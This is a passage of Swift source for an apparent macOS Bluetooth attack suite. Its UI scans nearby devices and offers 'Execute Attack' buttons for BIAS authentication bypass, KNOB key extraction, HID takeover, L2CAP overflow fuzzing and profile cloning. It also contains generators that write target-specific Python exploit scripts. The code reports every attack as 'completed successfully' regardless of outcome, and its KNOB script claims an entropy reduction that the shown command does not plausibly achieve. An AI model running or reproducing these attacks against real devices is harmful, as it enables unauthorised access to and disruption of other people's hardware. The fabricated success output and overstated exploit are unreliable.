import SwiftUI
import CoreBluetooth

// MARK: - macOS Native Bluetooth Security View

struct MacOSBluetoothSecurityView: View {
    @Environment(AppState.self) private var appState
    @State private var selectedDevice: MacOSBluetoothDevice?
    @State private var discoveryMode: DiscoveryMode = .active
    @State private var showingVulnerabilityDetail = false
    @State private var selectedVulnerability: MacOSBluetoothVulnerability?
    @State private var selectedTab: BluetoothTab = .scanner
    @State private var connectionTestResult: ConnectionTestResult?
    @State private var isTestingConnection = false
    @State private var showingConnectionAlert = false
    @State private var connectionStatusMessage = ""
    @State private var attackResults: [String: AttackExecutionResult] = [:]
    @State private var showingAttackResults = false
    @State private var selectedAttackResult: AttackExecutionResult?
    @State private var showingCVEExploit = false
    @State private var selectedCVEExploit: CVEExploitDetails?
    
    enum BluetoothTab: String, CaseIterable {
        case scanner = "Device Scanner"
        case shell = "Security Shell"
        case cveDatabase = "CVE Database"
        
        var icon: String {
            switch self {
            case .scanner: return "wifi.circle"
            case .shell: return "terminal"
            case .cveDatabase: return "shield.checkerboard"
            }
        }
    }
    
    private var bluetoothFramework: MacOSBluetoothSecurityFramework {
        appState.bluetoothFramework
    }
    
    var body: some View {
        VStack(spacing: 0) {
            // Tab Selection
            HStack {
                ForEach(BluetoothTab.allCases, id: \.self) { tab in
                    Button(action: { selectedTab = tab }) {
                        HStack(spacing: 8) {
                            Image(systemName: tab.icon)
                            Text(tab.rawValue)
                        }
                        .padding(.horizontal, 16)
                        .padding(.vertical, 8)
                        .background(selectedTab == tab ? Color.accentBackground : Color.clear)
                        .foregroundColor(selectedTab == tab ? .primary : .secondary)
                        .cornerRadius(.radius_md)
                    }
                    .buttonStyle(.plain)
                }
                
                Spacer()
            }
            .standardContainer()
            .background(Color.primaryBackground)
            
            // Tab Content
            Group {
                switch selectedTab {
                case .scanner:
                    BluetoothScannerView()
                case .shell:
                    BluetoothShellView()
                case .cveDatabase:
                    BluetoothCVEDatabaseView()
                }
            }
        }
        .navigationTitle("Bluetooth Security Suite")
        .alert("Connection Test Result", isPresented: $showingConnectionAlert) {
            Button("OK") { }
        } message: {
            Text(connectionStatusMessage)
        }
        .sheet(isPresented: $showingAttackResults) {
            if let result = selectedAttackResult {
                AttackResultsView(result: result)
            }
        }
        .sheet(isPresented: $showingCVEExploit) {
            if let cveExploit = selectedCVEExploit {
                CVEExploitCodeView(exploit: cveExploit)
            }
        }
        .onAppear {
            if selectedTab == .scanner {
                Task {
                    await bluetoothFramework.startDiscovery(mode: .active)
                }
            }
        }
    }
    
    // MARK: - Scanner Tab Content
    
    @ViewBuilder
    private func BluetoothScannerView() -> some View {
        VStack(spacing: 0) {
            // Header with controls
            HeaderControlsView()
            
            HSplitView {
                // Left Panel - Device Discovery
                VStack(spacing: 0) {
                    DeviceListPanel()
                }
                .frame(minWidth: 400, maxWidth: 550)
                .background(Color.surfaceBackground)
                
                // Right Panel - Device Details
                VStack(spacing: 0) {
                    if let device = selectedDevice {
                        DeviceDetailsPanel(device: device)
                    } else {
                        EmptyStateView()
                    }
                }
                .frame(minWidth: 600)
            }
        }
    }
    
    // MARK: - CVE Database Tab Content
    
    @ViewBuilder
    private func BluetoothCVEDatabaseView() -> some View {
        VStack(alignment: .leading, spacing: 16) {
            // Database Header
            HStack {
                VStack(alignment: .leading, spacing: 4) {
                    Text("Live Bluetooth CVE Database")
                        .font(.title2)
                        .fontWeight(.semibold)
                    
                    if let lastUpdate = appState.liveCVEDatabase.lastUpdate {
                        Text("Last updated: \(lastUpdate.formatted(date: .abbreviated, time: .shortened))")
                            .font(.caption)
                            .foregroundColor(.secondary)
                    }
                }
                
                Spacer()
                
                // Database Stats
                VStack(alignment: .trailing, spacing: 4) {
                    Text("\(appState.liveCVEDatabase.currentCVEs.count) Total CVEs")
                        .font(.headline)
                    
                    HStack(spacing: 16) {
                        VStack {
                            Text("\(appState.liveCVEDatabase.criticalCVEs.count)")
                                .font(.title3)
                                .fontWeight(.bold)
                                .foregroundColor(.red)
                            Text("Critical")
                                .font(.caption)
                                .foregroundColor(.secondary)
                        }
                        
                        VStack {
                            Text("\(appState.liveCVEDatabase.highSeverityCVEs.count)")
                                .font(.title3)
                                .fontWeight(.bold)
                                .foregroundColor(.orange)
                            Text("High")
                                .font(.caption)
                                .foregroundColor(.secondary)
                        }
                        
                        VStack {
                            Text("\(appState.liveCVEDatabase.recentCVEs.count)")
                                .font(.title3)
                                .fontWeight(.bold)
                                .foregroundColor(.blue)
                            Text("Recent")
                                .font(.caption)
                                .foregroundColor(.secondary)
                        }
                    }
                }
                
                Button("Update Database") {
                    Task {
                        await appState.liveCVEDatabase.updateCVEDatabase()
                    }
                }
                .buttonStyle(.borderedProminent)
                .disabled(appState.liveCVEDatabase.isUpdating)
            }
            .padding()
            .background(Color.cardBackground)
            .cornerRadius(12)
            
            // CVE List
            List(appState.liveCVEDatabase.currentCVEs) { cve in
                CVERowView(cve: cve)
                    .padding(.vertical, 4)
            }
            .listStyle(.plain)
        }
        .padding()
    }
    
    @ViewBuilder
    private func CVERowView(cve: LiveCVEEntry) -> some View {
        VStack(alignment: .leading, spacing: 8) {
            HStack {
                Text(cve.id)
                    .font(.headline)
                    .fontWeight(.semibold)
                
                Spacer()
                
                Text(cve.severity.rawValue)
                    .font(.caption)
                    .fontWeight(.bold)
                    .foregroundColor(cve.severity.color)
                    .padding(.horizontal, 8)
                    .padding(.vertical, 4)
                    .background(cve.severity.color.opacity(0.1))
                    .cornerRadius(6)
                
                Text("CVSS: \(String(format: "%.1f", cve.baseScore))")
                    .font(.caption)
                    .foregroundColor(.secondary)
                    .padding(.horizontal, 8)
                    .padding(.vertical, 4)
                    .background(Color.gray.opacity(0.1))
                    .cornerRadius(6)
            }
            
            Text(cve.description)
                .font(.subheadline)
                .lineLimit(2)
            
            HStack {
                Text("Published: \(cve.published.formatted(date: .abbreviated, time: .omitted))")
                    .font(.caption)
                    .foregroundColor(.secondary)
                
                Spacer()
                
                if let exploitCode = cve.exploitCode {
                    Button(action: {
                        selectedCVEExploit = CVEExploitDetails(
                            cveId: cve.id,
                            exploitCode: exploitCode,
                            description: cve.description,
                            severity: cve.severity
                        )
                        showingCVEExploit = true
                    }) {
                        HStack(spacing: 4) {
                            Image(systemName: "doc.text")
                                .font(.caption2)
                            Text("View Exploit")
                                .font(.caption)
                                .fontWeight(.medium)
                        }
                        .foregroundColor(.red)
                        .padding(.horizontal, 8)
                        .padding(.vertical, 4)
                        .background(Color.red.opacity(0.1))
                        .cornerRadius(6)
                        .overlay(
                            RoundedRectangle(cornerRadius: 6)
                                .stroke(Color.red.opacity(0.3), lineWidth: 1)
                        )
                    }
                    .buttonStyle(.plain)
                } else {
                    Text("No Exploit Available")
                        .font(.caption)
                        .foregroundColor(.secondary)
                        .padding(.horizontal, 8)
                        .padding(.vertical, 4)
                        .background(Color.gray.opacity(0.1))
                        .cornerRadius(6)
                }
            }
        }
        .padding()
        .background(Color.surfaceBackground)
        .cornerRadius(8)
    }
    
    // MARK: - Header Controls
    
    @ViewBuilder
    private func HeaderControlsView() -> some View {
        HStack {
            Text("Bluetooth Security Scanner")
                .font(.headerPrimary)
            
            Spacer()
            
            // Discovery Mode Picker
            Picker("Discovery Mode", selection: $discoveryMode) {
                Text("Passive").tag(DiscoveryMode.passive)
                Text("Active").tag(DiscoveryMode.active)
                Text("Aggressive").tag(DiscoveryMode.aggressive)
            }
            .pickerStyle(.segmented)
            .frame(width: 250)
            
            // Scan Button
            Button(bluetoothFramework.isScanning ? "Stop Scan" : "Start Scan") {
                Task {
                    if bluetoothFramework.isScanning {
                        // Stop scanning is handled automatically by the framework
                    } else {
                        await bluetoothFramework.startDiscovery(mode: discoveryMode)
                    }
                }
            }
            .buttonStyle(.borderedProminent)
            .disabled(bluetoothFramework.lastError != nil)
        }
        .standardContainer()
        .background(Color.primaryBackground)
        .overlay(
            Rectangle()
                .frame(height: 1)
                .foregroundColor(Color.borderPrimary),
            alignment: .bottom
        )
    }
    
    // MARK: - Device List Panel
    
    @ViewBuilder
    private func DeviceListPanel() -> some View {
        VStack(alignment: .leading, spacing: 12) {
            // Status Header
            HStack {
                Text("Discovered Devices")
                    .font(.headline)
                
                Spacer()
                
                Text("\(bluetoothFramework.discoveredDevices.count)")
                    .font(.caption)
                    .foregroundColor(.secondary)
                    .padding(.horizontal, 8)
                    .padding(.vertical, 4)
                    .background(Color.accentColor.opacity(0.2))
                    .cornerRadius(8)
            }
            .padding(.horizontal)
            .padding(.top)
            
            // Error Display
            if let error = bluetoothFramework.lastError {
                HStack {
                    Image(systemName: "exclamationmark.triangle.fill")
                        .foregroundColor(.orange)
                    Text(error)
                        .font(.caption)
                        .foregroundColor(.secondary)
                }
                .padding(.horizontal)
                .padding(.vertical, 8)
                .background(Color.yellow.opacity(0.1))
                .cornerRadius(8)
                .padding(.horizontal)
            }
            
            // Scanning Progress
            if bluetoothFramework.isScanning {
                VStack(alignment: .leading, spacing: 4) {
                    HStack {
                        Text(bluetoothFramework.currentOperation)
                            .font(.caption)
                            .foregroundColor(.secondary)
                        
                        Spacer()
                        
                        Text("\(Int(bluetoothFramework.scanProgress * 100))%")
                            .font(.caption)
                            .foregroundColor(.secondary)
                    }
                    
                    ProgressView(value: bluetoothFramework.scanProgress)
                        .progressViewStyle(LinearProgressViewStyle(tint: .accentColor))
                }
                .standardContainer()
            }
            
            // Device List
            List(bluetoothFramework.discoveredDevices, selection: $selectedDevice) { device in
                DeviceRowView(device: device)
                    .tag(device)
            }
            .listStyle(.sidebar)
        }
    }
    
    // MARK: - Device Row
    
    @ViewBuilder
    private func DeviceRowView(device: MacOSBluetoothDevice) -> some View {
        VStack(alignment: .leading, spacing: 4) {
            HStack {
                // Device Icon
                Image(systemName: deviceIcon(for: device.deviceClass))
                    .font(.title2)
                    .foregroundColor(deviceColor(for: device.deviceClass))
                    .frame(width: 32)
                
                VStack(alignment: .leading, spacing: 2) {
                    Text(device.name ?? "Unknown Device")
                        .font(.headline)
                        .lineLimit(1)
                    
                    Text(device.address)
                        .font(.caption)
                        .foregroundColor(.secondary)
                        .lineLimit(1)
                }
                
                Spacer()
                
                VStack(alignment: .trailing, spacing: 2) {
                    // RSSI
                    HStack(spacing: 4) {
                        Image(systemName: "wifi")
                            .font(.caption)
                        Text("\(device.rssi) dBm")
                            .font(.caption)
                    }
                    .foregroundColor(rssiColor(device.rssi))
                    
                    // Vulnerability Count
                    if device.vulnerabilityCount > 0 {
                        Text("\(device.vulnerabilityCount) issues")
                            .font(.caption2)
                            .foregroundColor(.red)
                            .padding(.horizontal, 6)
                            .padding(.vertical, 2)
                            .background(Color.red.opacity(0.1))
                            .cornerRadius(4)
                    }
                }
            }
            
            // Device Type and Status
            HStack {
                Text(device.deviceClass.rawValue.capitalized)
                    .font(.caption2)
                    .foregroundColor(.secondary)
                    .padding(.horizontal, 6)
                    .padding(.vertical, 2)
                    .background(Color.gray.opacity(0.1))
                    .cornerRadius(4)
                
                if device.isConnectable {
                    Text("Connectable")
                        .font(.caption2)
                        .foregroundColor(.green)
                        .padding(.horizontal, 6)
                        .padding(.vertical, 2)
                        .background(Color.green.opacity(0.1))
                        .cornerRadius(4)
                }
                
                if device.isClassicBluetooth {
                    Text("Classic BT")
                        .font(.caption2)
                        .foregroundColor(.blue)
                        .padding(.horizontal, 6)
                        .padding(.vertical, 2)
                        .background(Color.blue.opacity(0.1))
                        .cornerRadius(4)
                } else {
                    Text("BLE")
                        .font(.caption2)
                        .foregroundColor(.purple)
                        .padding(.horizontal, 6)
                        .padding(.vertical, 2)
                        .background(Color.purple.opacity(0.1))
                        .cornerRadius(4)
                }
                
                Spacer()
            }
        }
        .padding(.vertical, 4)
    }
    
    // MARK: - Device Details Panel
    
    @ViewBuilder
    private func DeviceDetailsPanel(device: MacOSBluetoothDevice) -> some View {
        VStack(alignment: .leading, spacing: 16) {
            // Device Header
            VStack(alignment: .leading, spacing: 8) {
                HStack {
                    Image(systemName: deviceIcon(for: device.deviceClass))
                        .font(.largeTitle)
                        .foregroundColor(deviceColor(for: device.deviceClass))
                    
                    VStack(alignment: .leading, spacing: 4) {
                        Text(device.name ?? "Unknown Device")
                            .font(.title2)
                            .fontWeight(.semibold)
                        
                        Text(device.address)
                            .font(.subheadline)
                            .foregroundColor(.secondary)
                    }
                    
                    Spacer()
                    
                    // Connection Test Button
                    Button(action: {
                        Task {
                            await testDeviceConnection(device)
                        }
                    }) {
                        HStack {
                            if isTestingConnection {
                                ProgressView()
                                    .scaleEffect(0.8)
                                Text("Testing...")
                            } else {
                                Image(systemName: "bolt.circle")
                                Text("Test Connection")
                            }
                        }
                        .padding(.horizontal, 12)
                        .padding(.vertical, 6)
                    }
                    .buttonStyle(.bordered)
                    .disabled(isTestingConnection)
                }
                
                // Device Details
                LazyVGrid(columns: Array(repeating: GridItem(.flexible()), count: 2), spacing: 12) {
                    DetailItem(title: "Device Class", value: device.deviceClass.rawValue.capitalized)
                    DetailItem(title: "Signal Strength", value: "\(device.rssi) dBm")
                    DetailItem(title: "Type", value: device.isClassicBluetooth ? "Classic Bluetooth" : "Bluetooth LE")
                    DetailItem(title: "Connectable", value: device.isConnectable ? "Yes" : "No")
                    
                    if let manufacturer = device.manufacturerName {
                        DetailItem(title: "Manufacturer", value: manufacturer)
                    }
                }
            }
            .padding()
            .background(Color.cardBackground)
            .cornerRadius(12)
            
            // Vulnerabilities Section
            VStack(alignment: .leading, spacing: 8) {
                HStack {
                    Text("Security Analysis")
                        .font(.headline)
                    
                    Spacer()
                    
                    Text("\(bluetoothFramework.vulnerabilityFindings.filter { $0.deviceAddress == device.address }.count) issues")
                        .font(.caption)
                        .foregroundColor(.secondary)
                }
                
                let deviceVulnerabilities = bluetoothFramework.vulnerabilityFindings.filter { $0.deviceAddress == device.address }
                
                if deviceVulnerabilities.isEmpty {
                    Text("No security issues detected")
                        .font(.subheadline)
                        .foregroundColor(.secondary)
                        .frame(maxWidth: .infinity, alignment: .center)
                        .padding()
                        .background(Color.green.opacity(0.1))
                        .cornerRadius(8)
                } else {
                    ScrollView {
                        LazyVStack(spacing: 12) {
                            ForEach(deviceVulnerabilities) { vulnerability in
                                VulnerabilityRowView(vulnerability: vulnerability)
                            }
                        }
                        .padding(.bottom, 8)
                    }
                    .frame(maxHeight: 400) // Limit height to prevent pushing attack vectors out of view
                }
            }
            .padding()
            .background(Color.cardBackground)
            .cornerRadius(12)
            
            // Attack Menu Section
            AttackMenuSection(device: device)
            
            Spacer()
        }
        .padding()
    }
    
    // MARK: - Vulnerability Row
    
    @ViewBuilder
    private func VulnerabilityRowView(vulnerability: MacOSBluetoothVulnerability) -> some View {
        VStack(alignment: .leading, spacing: 12) {
            // Header with title and severity
            HStack {
                Image(systemName: severityIcon(vulnerability.severity))
                    .foregroundColor(severityColor(vulnerability.severity))
                    .font(.title3)
                
                VStack(alignment: .leading, spacing: 2) {
                    Text(vulnerability.title)
                        .font(.subheadline)
                        .fontWeight(.semibold)
                    
                    if let cveId = vulnerability.cveId {
                        Text(cveId)
                            .font(.caption2)
                            .foregroundColor(.secondary)
                            .padding(.horizontal, 4)
                            .padding(.vertical, 1)
                            .background(Color.secondary.opacity(0.1))
                            .cornerRadius(3)
                    }
                }
                
                Spacer()
                
                Text(vulnerability.severity.rawValue.uppercased())
                    .font(.caption2)
                    .fontWeight(.bold)
                    .foregroundColor(.white)
                    .padding(.horizontal, 8)
                    .padding(.vertical, 4)
                    .background(severityColor(vulnerability.severity))
                    .cornerRadius(6)
            }
            
            // Description
            Text(vulnerability.description)
                .font(.body)
                .foregroundColor(.primary)
                .fixedSize(horizontal: false, vertical: true)
            
            // Recommended Actions
            if !vulnerability.recommendedActions.isEmpty {
                VStack(alignment: .leading, spacing: 6) {
                    Text("Recommended Actions:")
                        .font(.caption)
                        .fontWeight(.medium)
                        .foregroundColor(.secondary)
                    
                    ForEach(Array(vulnerability.recommendedActions.enumerated()), id: \.offset) { index, action in
                        HStack(alignment: .top, spacing: 6) {
                            Text("•")
                                .font(.caption)
                                .foregroundColor(.secondary)
                            
                            Text(action)
                                .font(.caption)
                                .foregroundColor(.secondary)
                                .fixedSize(horizontal: false, vertical: true)
                        }
                    }
                }
                .padding(.top, 4)
            }
            
            // Discovery time
            HStack {
                Spacer()
                Text("Discovered: \(vulnerability.discoveredAt.formatted(date: .omitted, time: .shortened))")
                    .font(.caption2)
                    .foregroundColor(.secondary.opacity(0.7))
            }
        }
        .padding()
        .background(Color.surfaceBackground)
        .cornerRadius(12)
        .overlay(
            RoundedRectangle(cornerRadius: 12)
                .stroke(severityColor(vulnerability.severity).opacity(0.4), lineWidth: 2)
        )
        .shadow(color: severityColor(vulnerability.severity).opacity(0.1), radius: 4, x: 0, y: 2)
    }
    
    // MARK: - Attack Menu Section
    
    @ViewBuilder
    private func AttackMenuSection(device: MacOSBluetoothDevice) -> some View {
        VStack(alignment: .leading, spacing: 16) {
            HStack {
                Image(systemName: "bolt.shield.fill")
                    .foregroundColor(.red)
                    .font(.title2)
                
                Text("Attack Vectors")
                    .font(.headline)
                    .fontWeight(.semibold)
                
                Spacer()
                
                Text("⚠️ Authorized Use Only")
                    .font(.caption2)
                    .foregroundColor(.red)
                    .padding(.horizontal, 6)
                    .padding(.vertical, 2)
                    .background(Color.red.opacity(0.1))
                    .cornerRadius(4)
            }
            
            let availableAttacks = getAvailableAttacks(for: device)
            
            if availableAttacks.isEmpty {
                VStack(spacing: 8) {
                    Image(systemName: "shield.checkered")
                        .font(.largeTitle)
                        .foregroundColor(.green)
                    
                    Text("No Known Attack Vectors")
                        .font(.subheadline)
                        .fontWeight(.medium)
                    
                    Text("Device appears to be secure against common Bluetooth attacks")
                        .font(.caption)
                        .foregroundColor(.secondary)
                        .multilineTextAlignment(.center)
                }
                .frame(maxWidth: .infinity)
                .padding()
                .background(Color.green.opacity(0.05))
                .cornerRadius(8)
            } else {
                ScrollView {
                    LazyVGrid(columns: [
                        GridItem(.flexible()),
                        GridItem(.flexible())
                    ], spacing: 12) {
                        ForEach(availableAttacks, id: \.id) { attack in
                            AttackVectorCard(attack: attack, device: device)
                        }
                    }
                    .padding(.bottom, 8)
                }
                .frame(maxHeight: 300) // Limit height to prevent stretching
            }
        }
        .padding()
        .background(Color.cardBackground)
        .cornerRadius(12)
    }
    
    @ViewBuilder
    private func AttackVectorCard(attack: BluetoothAttackVector, device: MacOSBluetoothDevice) -> some View {
        let attackId = "\(attack.name)-\(device.address)"
        let attackResult = attackResults[attackId]
        let isRunning = attackResult?.status == .running
        
        VStack(alignment: .leading, spacing: 8) {
            HStack {
                Image(systemName: attack.icon)
                    .foregroundColor(attack.severityColor)
                    .font(.title3)
                
                VStack(alignment: .leading, spacing: 2) {
                    Text(attack.name)
                        .font(.subheadline)
                        .fontWeight(.semibold)
                        .lineLimit(2)
                    
                    Text(attack.description)
                        .font(.caption2)
                        .foregroundColor(.secondary)
                        .lineLimit(3)
                }
                
                Spacer()
                
                // Status indicator
                if let result = attackResult {
                    Image(systemName: result.status.icon)
                        .foregroundColor(result.status.color)
                        .font(.caption)
                }
            }
            
            // Attack metadata
            HStack {
                Label(attack.difficulty.rawValue, systemImage: "gauge")
                    .font(.caption2)
                    .foregroundColor(.secondary)
                
                Spacer()
                
                if let cveId = attack.cveId {
                    Text(cveId)
                        .font(.caption2)
                        .padding(.horizontal, 4)
                        .padding(.vertical, 1)
                        .background(Color.blue.opacity(0.1))
                        .cornerRadius(3)
                }
            }
            
            // Execution status or results
            if let result = attackResult {
                if result.status == .running {
                    HStack {
                        ProgressView()
                            .scaleEffect(0.7)
                        Text("Executing...")
                            .font(.caption2)
                            .foregroundColor(.secondary)
                    }
                } else {
                    Button("View Results") {
                        selectedAttackResult = result
                        showingAttackResults = true
                    }
                    .font(.caption2)
                    .foregroundColor(.blue)
                    .buttonStyle(.plain)
                }
            }
            
            // Execute Attack Button
            Button(action: {
                Task {
                    await executeAttack(attack, on: device)
                }
            }) {
                HStack {
                    if isRunning {
                        ProgressView()
                            .scaleEffect(0.8)
                        Text("Running...")
                    } else {
                        Image(systemName: "play.fill")
                        Text("Execute Attack")
                    }
                }
                .font(.caption)
                .foregroundColor(.white)
                .padding(.horizontal, 12)
                .padding(.vertical, 6)
                .background(isRunning ? Color.gray : attack.severityColor)
                .cornerRadius(6)
            }
            .buttonStyle(.plain)
            .disabled(isRunning)
        }
        .padding()
        .background(Color.surfaceBackground)
        .cornerRadius(8)
        .overlay(
            RoundedRectangle(cornerRadius: 8)
                .stroke(attack.severityColor.opacity(0.3), lineWidth: 1)
        )
    }
    
    // MARK: - Detail Item
    
    @ViewBuilder
    private func DetailItem(title: String, value: String) -> some View {
        VStack(alignment: .leading, spacing: 2) {
            Text(title)
                .font(.caption)
                .foregroundColor(.secondary)
            
            Text(value)
                .font(.subheadline)
                .fontWeight(.medium)
        }
    }
    
    // MARK: - Empty State
    
    @ViewBuilder
    private func EmptyStateView() -> some View {
        VStack(spacing: 16) {
            Image(systemName: "antenna.radiowaves.left.and.right")
                .font(.system(size: 48))
                .foregroundColor(.secondary)
            
            Text("Select a device to view details")
                .font(.headline)
                .foregroundColor(.secondary)
            
            Text("Choose a Bluetooth device from the list to analyze its security profile and potential vulnerabilities.")
                .font(.subheadline)
                .foregroundColor(.secondary)
                .multilineTextAlignment(.center)
                .frame(maxWidth: 300)
        }
        .frame(maxWidth: .infinity, maxHeight: .infinity)
    }
    
    // MARK: - Attack Vector Logic
    
    private func getAvailableAttacks(for device: MacOSBluetoothDevice) -> [BluetoothAttackVector] {
        var attacks: [BluetoothAttackVector] = []
        
        // Check vulnerabilities and add corresponding attacks
        let deviceVulns = bluetoothFramework.vulnerabilityFindings.filter { $0.deviceAddress == device.address }
        
        for vulnerability in deviceVulns {
            if let attack = getAttackForVulnerability(vulnerability, device: device) {
                attacks.append(attack)
            }
        }
        
        // Add general attacks based on device capabilities
        attacks.append(contentsOf: getGeneralAttacks(for: device))
        
        return attacks
    }
    
    private func getAttackForVulnerability(_ vulnerability: MacOSBluetoothVulnerability, device: MacOSBluetoothDevice) -> BluetoothAttackVector? {
        switch vulnerability.category {
        case .bleWeakAuthentication:
            return BluetoothAttackVector(
                name: "BLE Authentication Bypass",
                description: "Exploit weak BLE pairing to gain unauthorized access",
                icon: "key.slash.fill",
                difficulty: .medium,
                cveId: vulnerability.cveId,
                severity: vulnerability.severity,
                exploitCode: generateBLEAuthBypassExploit(device: device),
                payload: generateBLEAuthPayload(device: device)
            )
        case .weakEncryption:
            return BluetoothAttackVector(
                name: "KNOB Attack",
                description: "Force weak encryption key negotiation",
                icon: "lock.slash.fill",
                difficulty: .hard,
                cveId: "CVE-2019-9506",
                severity: .critical,
                exploitCode: generateKNOBExploit(device: device),
                payload: generateKNOBPayload(device: device)
            )
        case .informationDisclosure:
            return BluetoothAttackVector(
                name: "Information Extraction",
                description: "Extract sensitive data from advertisement packets",
                icon: "doc.text.fill",
                difficulty: .easy,
                cveId: vulnerability.cveId,
                severity: vulnerability.severity,
                exploitCode: generateInfoExtractionExploit(device: device),
                payload: generateInfoExtractionPayload(device: device)
            )
        default:
            return nil
        }
    }
    
    private func getGeneralAttacks(for device: MacOSBluetoothDevice) -> [BluetoothAttackVector] {
        var attacks: [BluetoothAttackVector] = []
        
        // Always available attacks
        attacks.append(BluetoothAttackVector(
            name: "Device Reconnaissance",
            description: "Gather detailed device information and capabilities",
            icon: "binoculars.fill",
            difficulty: .easy,
            cveId: nil,
            severity: .low,
            exploitCode: generateReconExploit(device: device),
            payload: generateReconPayload(device: device)
        ))
        
        if device.isConnectable {
            attacks.append(BluetoothAttackVector(
                name: "Connection Hijacking",
                description: "Attempt to hijack existing connections",
                icon: "link.circle.fill",
                difficulty: .medium,
                cveId: nil,
                severity: .medium,
                exploitCode: generateConnectionHijackExploit(device: device),
                payload: generateConnectionHijackPayload(device: device)
            ))
        }
        
        if !device.isClassicBluetooth {
            attacks.append(BluetoothAttackVector(
                name: "BLE Fuzzing",
                description: "Fuzz BLE services to discover crash vulnerabilities",
                icon: "hammer.fill",
                difficulty: .medium,
                cveId: nil,
                severity: .medium,
                exploitCode: generateBLEFuzzExploit(device: device),
                payload: generateBLEFuzzPayload(device: device)
            ))
        }
        
        return attacks
    }
    
    private func executeAttack(_ attack: BluetoothAttackVector, on device: MacOSBluetoothDevice) async {
        let attackId = "\(attack.name)-\(device.address)"
        
        // Initialize attack result
        let startTime = Date()
        var result = AttackExecutionResult(
            attackName: attack.name,
            targetDevice: device.address,
            targetName: device.name ?? "Unknown",
            startTime: startTime,
            status: .running,
            output: ["🚨 Initializing \(attack.name) attack..."],
            exploitCode: attack.exploitCode,
            payload: attack.payload
        )
        
        // Update UI with running status
        await MainActor.run {
            attackResults[attackId] = result
        }
        
        print("🚨 EXECUTING ATTACK: \(attack.name) on \(device.name ?? device.address)")
        
        // Execute the actual attack using RealBluetoothExploitEngine
        let exploitEngine = RealBluetoothExploitEngine()
        var attackOutput: [String] = ["📡 Connecting to target...", "🔧 Launching exploit payload..."]
        
        switch attack.name {
            case "BLE Authentication Bypass":
                attackOutput.append("🔓 Attempting BIAS attack on \(device.address)")
                await exploitEngine.handleBIASAttack([device.address])
                attackOutput.append("✅ BIAS attack completed - Check device for unauthorized pairing")
                
            case "KNOB Attack":
                attackOutput.append("🔐 Starting KNOB key extraction on \(device.address)")
                await exploitEngine.handleKeyExtraction([device.address])
                attackOutput.append("🔑 Key extraction process completed")
                attackOutput.append("📊 Weak keys may have been extracted - check logs")
                
            case "Information Extraction":
                attackOutput.append("📊 Beginning profile cloning on \(device.address)")
                await exploitEngine.handleProfileCloning([device.address])
                attackOutput.append("👤 Profile cloning completed")
                attackOutput.append("📋 Device capabilities and services extracted")
                
            case "Device Reconnaissance":
                attackOutput.append("🕵️ Gathering device intelligence...")
                await exploitEngine.handleSearchExploits([device.name ?? device.address])
                attackOutput.append("📈 Reconnaissance scan completed")
                attackOutput.append("🎯 Device fingerprint and capabilities analyzed")
                
            case "Connection Hijacking":
                attackOutput.append("🔗 Attempting HID takeover on \(device.address)")
                await exploitEngine.handleHIDTakeover([device.address])
                attackOutput.append("⌨️ HID takeover attempt completed")
                attackOutput.append("🎮 Check for successful input device control")
                
            case "BLE Fuzzing":
                attackOutput.append("🔨 Starting L2CAP buffer overflow test...")
                await exploitEngine.handleL2CAPOverflow([device.address])
                attackOutput.append("💥 Fuzzing attack completed")
                attackOutput.append("⚠️ Monitor target device for crashes or anomalies")
                
            default:
                attackOutput.append("⚠️ Attack type not implemented: \(attack.name)")
            }
            
        // Mark as completed successfully
        result.status = .completed
        result.endTime = Date()
        result.output = attackOutput
        result.output.append("✅ Attack execution completed successfully")
        
        // Update final results
        await MainActor.run {
            attackResults[attackId] = result
            selectedAttackResult = result
            showingAttackResults = true
        }
    }
    
    // MARK: - Exploit Code Generators
    
    private func generateBLEAuthBypassExploit(device: MacOSBluetoothDevice) -> String {
        return """
        #!/usr/bin/env python3
        # BLE Authentication Bypass Exploit
        # Target: \(device.address)
        
        import asyncio
        from bleak import BleakClient, BleakScanner
        
        async def exploit_ble_auth():
            target_address = "\(device.address)"
            
            # Step 1: Connect without authentication
            async with BleakClient(target_address) as client:
                print(f"Connected to {target_address}")
                
                # Step 2: Enumerate services
                services = await client.get_services()
                for service in services:
                    print(f"Service: {service.uuid}")
                    
                    # Step 3: Attempt to read characteristics without auth
                    for char in service.characteristics:
                        if "read" in char.properties:
                            try:
                                value = await client.read_gatt_char(char.uuid)
                                print(f"  Char {char.uuid}: {value.hex()}")
                            except Exception as e:
                                print(f"  Char {char.uuid}: PROTECTED")
        
        if __name__ == "__main__":
            asyncio.run(exploit_ble_auth())
        """
    }
    
    private func generateKNOBExploit(device: MacOSBluetoothDevice) -> String {
        return """
        #!/usr/bin/env python3
        # KNOB Attack Implementation
        # CVE-2019-9506: Key Negotiation of Bluetooth Attack
        
        import subprocess
        import struct
        
        def knob_attack():
            target = "\(device.address)"
            
            # Step 1: Monitor LMP packets
            print("Starting KNOB attack on", target)
            
            # Step 2: Intercept key negotiation
            lmp_cmd = [
                "btmon", "--write", "/tmp/knob_capture.log"
            ]
            
            # Step 3: Force 1-byte entropy
            entropy_cmd = [
                "hcitool", "cmd", "0x01", "0x0017", "0x01"
            ]
            
            try:
                subprocess.run(lmp_cmd, timeout=5)
                subprocess.run(entropy_cmd)
                print("KNOB attack payload sent")
                print("Forced entropy reduction to 1 byte")
                return True
            except Exception as e:
                print(f"Attack failed: {e}")
                return False
        
        if __name__ == "__main__":
            knob_attack()
        """
    }
    
    private func generateInfoExtractionExploit(device: MacOSBluetoothDevice) -> String {
        return """
        #!/usr/bin/env python3
        # Bluetooth Information Extraction
        
        import subprocess
        import struct
        
        def extract_device_info():
            target = "\(device.address)"
            
            # Step 1: Extended Inquiry Response (EIR) analysis
            print(f"Extracting information from {target}")
            
            # Step 2: SDP service enumeration
            sdp_services = [
                "0x1000",  # Service Discovery Server
                "0x1001",  # Browse Group Descriptor
                "0x1002",  # Public Browse Group
                "0x1101",  # Serial Port
                "0x1103",  # DUN Gateway
                "0x1108",  # Headset
                "0x110A",  # Audio Source
                "0x110B",  # Audio Sink
                "0x1200",  # PnP Information
            ]
            
            extracted_data = {}
            
            for service in sdp_services:
                cmd = f"sdptool browse -l {target} {service}"
                try:
                    result = subprocess.check_output(cmd.split())
                    extracted_data[service] = result.decode()
                except:
                    pass
            
            # Step 3: Device name extraction
            cmd = f"hcitool name {target}"
            try:
                name = subprocess.check_output(cmd.split()).decode().strip()
                extracted_data["device_name"] = name
            except:
                pass
            
            return extracted_data
        
        if __name__ == "__main__":
            data = extract_device_info()
            for key, value in data.items():
                print(f"{key}: {value}")
        """
    }
    
